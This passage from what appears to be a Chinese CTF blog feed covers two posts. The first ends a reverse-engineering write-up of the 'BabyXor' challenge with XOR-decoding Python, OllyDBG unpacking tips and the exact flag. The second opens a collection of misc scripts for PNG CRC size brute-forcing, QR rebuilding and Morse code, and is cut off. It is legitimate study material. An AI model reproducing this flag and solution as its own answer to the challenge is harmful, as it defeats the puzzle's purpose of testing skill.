number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>dword_435DF8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>dword_435E30 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>由于数据是小端序存放，每组中间间隔的 “0x00, 0x00, 0x00” 是高位<br>即：内存中 <code>&quot;0x1A, 0x00, 0x00, 0x00&quot;</code> 代表 <code>&quot;0x0000001A&quot;</code><br>根据 <code>a2 &gt;&gt; 2</code> 也可知，<code>56 &gt;&gt; 2 = 14</code>，每 4 个十六进制一组，共 56 &#x2F; 4 &#x3D; 14 组<br>所以导出的数据其实可以简化如下：（<em>可以在 Pycharm 中使用 Ctrl + F 进行替换快速得到</em>）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">unk_435DC0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span>    dword_435DF8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">]</span>    dword_435E30 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="11"><li>按照程序逻辑，编写脚本，分别使用三个函数生成三个字符串，然后进行拼接</li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">unk_435DC0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span>  dword_435DF8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">]</span>  dword_435E30 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span>    v8 <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      v8 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i <span class="token operator">^</span> unk_435DC0<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span>      Src <span class="token operator">=</span> <span class="token string">""</span>  Src <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>dword_435DF8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 下面的循环是从第二个元素开始，不要忘了还有个没改变的第一个值  </span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      Src <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>unk_435DC0<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> dword_435DF8<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> unk_435DC0<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>Src<span class="token punctuation">)</span>      Source <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      Source <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>k <span class="token operator">^</span> dword_435E30<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>Src<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  Destination <span class="token operator">=</span> <span class="token string">""</span>  Destination <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>dword_435DF8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> dword_435E30<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  v5 <span class="token operator">=</span> Destination <span class="token operator">+</span> Source  <span class="token keyword">print</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span>      flag <span class="token operator">=</span> v8 <span class="token operator">+</span> Src <span class="token operator">+</span> v5  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>由于发现 flag 与程序输入无关，是由程序内部的数据运算得到的<br>并且 <code>sub_40101E(v8, Src, v5)</code> 函数中直接拼接得到了 flag<br>所以 flag 一定会出现在程序中<br>于是可以通过调试来观察 flag</p></li><li><p>用 OllyDBG 打开<br>定位到最后拼接 flag 的 <code>sub_40101E(v8, Src, v5)</code> 函数处<br>根据 <code>call    sub_40101E</code> 的地址 <code>0x00401712</code> 处下断点<br>直接运行看堆栈数据就能得出 flag</p></li></ol><blockquote><p><del>但是前面我脱壳之后的程序只能在 IDA 中正常分析，却无法双击运行</del></p><p>原因找到了，在 <code>右键 --&gt; 用 OllyDump脱壳调试进程</code> 进行脱壳的时候<br><img src="https://s2.loli.net/2023/05/10/q6VpxGaQbN3AMim.png" alt="攻防世界_BabyXor29.png"><br>左下角有两种方式<br>我前面是选择的 <code>方式 1</code>，虽然成功脱壳了，可以 IDA 静态分析，但是却无法运行程序<br>现在选了 <code>方式 2</code> 试了一下，发现既可以 IDA 静态分析，也可以运行程序了<br>（<mark>脱壳的时候最好两种方式都试一试</mark>）</p></blockquote><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</p></blockquote><p><img src="https://s2.loli.net/2023/05/10/5OAkGC3NKIfT2JU.png" alt="攻防世界_BabyXor28.png"></p>]]></content>
    
    
    <summary type="html">攻防世界一道逆向，UNCTF2019 的一道题，主要考察 OllyDBG 手动脱壳，这里用到的是 ESP 脱壳定律，记录一下第一次手动调试脱壳的经历</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>杂项中的脚本</title>
    <link href="https://www.4ss1du0us.cn/2023/0560e8d6d2.html"/>
    <id>https://www.4ss1du0us.cn/2023/0560e8d6d2.html</id>
    <published>2023-05-09T08:11:01.000Z</published>
    <updated>2023-05-11T05:27:45.141Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CRC-爆破图片宽高"><a href="#CRC-爆破图片宽高" class="headerlink" title="CRC 爆破图片宽高"></a>CRC 爆破图片宽高</h2><p><img src="https://s2.loli.net/2023/05/09/u1UEOkLw4BaNi2W.png" alt="隐写1.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct  <span class="token keyword">import</span> zlib    <span class="token comment"># --------------- 需要修改的参数 ---------------</span><span class="token comment"># (直接从WinHex中以十六进制数值复制选块)</span>str1 <span class="token operator">=</span> <span class="token string">"49484452"</span>  <span class="token comment"># IHDR  </span>width <span class="token operator">=</span> <span class="token string">"01DA"</span>  <span class="token comment"># 图片宽度  </span>height <span class="token operator">=</span> <span class="token string">"00EF"</span>  <span class="token comment"># 图片高度  </span>str2 <span class="token operator">=</span> <span class="token string">"0806000000"</span>  <span class="token comment"># 图片高度height~CRC之间的5个字节  </span>crc32 <span class="token operator">=</span> <span class="token string">"52084BFB"</span>  <span class="token comment"># CRC  </span>add_num <span class="token operator">=</span> <span class="token number">2000</span>  <span class="token comment"># 最大宽高，合理修改快速出flag (一般可不修改)  </span><span class="token comment"># -------------------------------------------  </span>    <span class="token keyword">def</span> <span class="token function">hexStr2bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>      b <span class="token operator">=</span> <span class="token string">b""</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          temp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span>          b <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> b      check <span class="token operator">=</span> <span class="token number">0</span>  bytes1 <span class="token operator">=</span> hexStr2bytes<span class="token punctuation">(</span>str1<span class="token punctuation">)</span>  bytes2 <span class="token operator">=</span> hexStr2bytes<span class="token punctuation">(</span>str2<span class="token punctuation">)</span>  crc <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>crc32<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  wid <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  hei <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>height<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>wid<span class="token punctuation">,</span> wid <span class="token operator">+</span> add_num<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> h <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>hei<span class="token punctuation">,</span> hei <span class="token operator">+</span> add_num<span class="token punctuation">)</span><span class="token punctuation">:</span>          width <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>          height <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>          bytes_temp <span class="token operator">=</span> hexStr2bytes<span class="token punctuation">(</span>width <span class="token operator">+</span> height<span class="token punctuation">)</span>          <span class="token keyword">if</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>zlib<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>bytes1 <span class="token operator">+</span> bytes_temp <span class="token operator">+</span> bytes2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"爆破成功!"</span><span class="token punctuation">)</span>              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确的宽高:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">)</span>              check <span class="token operator">=</span> <span class="token number">1</span>              <span class="token keyword">break</span>  <span class="token keyword">if</span> check <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"爆破失败！"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="01序列转二维码"><a href="#01序列转二维码" class="headerlink" title="01序列转二维码"></a>01序列转二维码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image    key <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># 二维码01序列  </span>MAX <span class="token operator">=</span> <span class="token number">25</span>  <span class="token comment"># 二维码的长宽  </span>pic <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>MAX<span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">)</span>  white <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>  black <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">if</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>              pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span><span class="token punctuation">,</span> black<span class="token punctuation">)</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span><span class="token punctuation">,</span> white<span class="token punctuation">)</span>          i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>  pic<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="摩斯密码加解密"><a href="#摩斯密码加解密" class="headerlink" title="摩斯密码加解密"></a>摩斯密码加解密</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">MORSE_CODE_DICT <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token string">'.-'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token string">'-...'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token string">'-.-.'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">:</span> <span class="token string">'-..'</span><span class="token punctuation">,</span>                     <span class="token string">'E'</span><span class="token punctuation">:</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">:</span> <span class="token string">'..-.'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">:</span> <span class="token string">'--.'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">:</span> <span class="token string">'....'</span><span class="token punctuation">,</span>                     <span class="token string">'I'</span><span class="token punctuation">:</span> <span class="token string">'..'</span><span class="token punctuation">,</span> <span class="token string">'J'</span><span class="token punctuation">:</span> <span class="token string">'.---'</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">:</span> <span class="token string">'-.-'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">:</span> <span class="token string">'.-..'</span><span class="token punctuation">,</span>                     <span class="token string">'M'</span><span class="token punctuation">:</span> <span class="token string">'--'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">:</span> <span class="token string">'-.'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">:</span> <span class="token string">'---'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">:</span> <span class="token string">'.--.'</span><span class="token punctuation">,</span>                     <span class="token string">'Q'</span><span class="token punctuation">:</span> <span class="token string">'--.-'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">:</span> <span class="token string">'.-.'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">:</span> <span class="token string">'...'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">:</span> <span class="token string">'-'</span><span class="token punctuation">,</span>                     <span class="token string">'U'</span><span class="token punctuation">:</span> <span class="token string">'..-'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">:</span> <span class="token string">'...-'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">:</span> <span class="token string">'.--'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">:</span> <span class="token string">'-..-'</span><span class="token punctuation">,</span>                     <span class="token string">'Y'</span><span class="token punctuation">:</span> <span class="token string">'-.--'</span><span class="token punctuation">,</span> <span class="token string">'Z'</span><span class="token punctuation">:</span> <span class="token string">'--..'</span><span class="token punctuation">,</span>                     <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'-----'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'.----'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'..---'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token string">'...--'</span><span class="token punctuation">,</span>                     <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">'....-'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token 